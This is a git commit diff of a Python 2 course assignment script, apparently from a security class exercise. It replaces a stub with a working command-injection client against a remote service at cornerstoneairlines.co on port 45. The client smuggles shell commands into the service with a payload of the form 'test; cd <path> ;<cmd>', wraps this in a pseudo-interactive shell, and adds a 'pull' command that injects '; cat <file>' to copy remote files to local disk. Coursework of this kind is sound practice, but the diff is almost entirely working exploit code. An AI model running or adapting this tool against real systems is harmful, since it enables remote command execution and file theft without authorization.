eb11a89ea9eb45cf62d79878454ae922f36e9b3a
haina358 <32758231+haina358@users.noreply.github.com>
2018-09-27 23:33:14 -0400

    Update stub.py

--- week/4/stub.py
+++ week/4/stub.py
@@ -1,37 +1,73 @@
-"""
-    Use the same techniques such as (but not limited to):
-        1) Sockets
-        2) File I/O
-        3) raw_input()
-
-    from the OSINT HW to complete this assignment. Good luck!
-"""
-
 import socket
+import time
 
-host = "cornerstoneairlines.co" # IP address here
-port = 45 # Port here
+from pip._vendor.distlib.compat import raw_input
 
-def execute_cmd(cmd):
-    """
-        Sockets: https://docs.python.org/2/library/socket.html
-        How to use the socket s:
+host = "cornerstoneairlines.co"  # IP address here
+port = 45  # Port here
 
-            # Establish socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
 
-            Reading:
+def run(pth, cmd, second):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    split = str.split(cmd)
 
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
+    if second == 10:
+        s.recv(1024)
+        s.send(str.encode("test; cd ") + str.encode(pth) + str.encode(" ;") + str.encode(cmd) + str.encode("\n"))
+        data = s.recv(1024)
+        time.sleep(2)
+        print(data)
 
-            Sending:
+    elif split[0] == "pull":
+        s.send("; cat " + split[1] + "\n")
+        data = s.recv(4096)
+        f = open(split[2], 'w')
+        f.write(data)
+        f.close()
 
-                s.send("something to send\n")   # Send a newline \n at the end of your command
-    """
-    print("IMPLEMENT ME")
+    else:
+        print(
+            "shell Drop into an interactive shell and allow users to gracefully exit\n"
+            "pull <remote-path> <local-path> Download files\nhelp Shows this help menu\nquit Quit the shell")
+
+    s.close
 
 
 if __name__ == '__main__':
-    print("IMPLEMENT ME")
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    first = True;
+
+    while first:
+        cmd = raw_input(">")
+        pth = "/"
+        spit = str.split(cmd)
+
+        if spit[0] == "pull":
+            run(pth, cmd, 15)
+
+        elif cmd == "quit":
+            exit()
+            s.close()
+
+        elif cmd == "shell":
+            pth = "/"
+            second = True
+
+            while second:
+                cmd = raw_input(pth + ">")
+
+                if cmd == "exit":
+                    second = False
+
+                elif "cd" in cmd:
+                    pth = cmd[3:]
+                    if not pth: pth = "/"
+
+                else: run(pth, cmd, 10)
+        else :
+            print(
+                "shell Drop into an interactive shell and allow users to gracefully exit\n"
+                "pull <remote-path> <local-path> Download files\nhelp Shows this help menu\nquit Quit the shell")
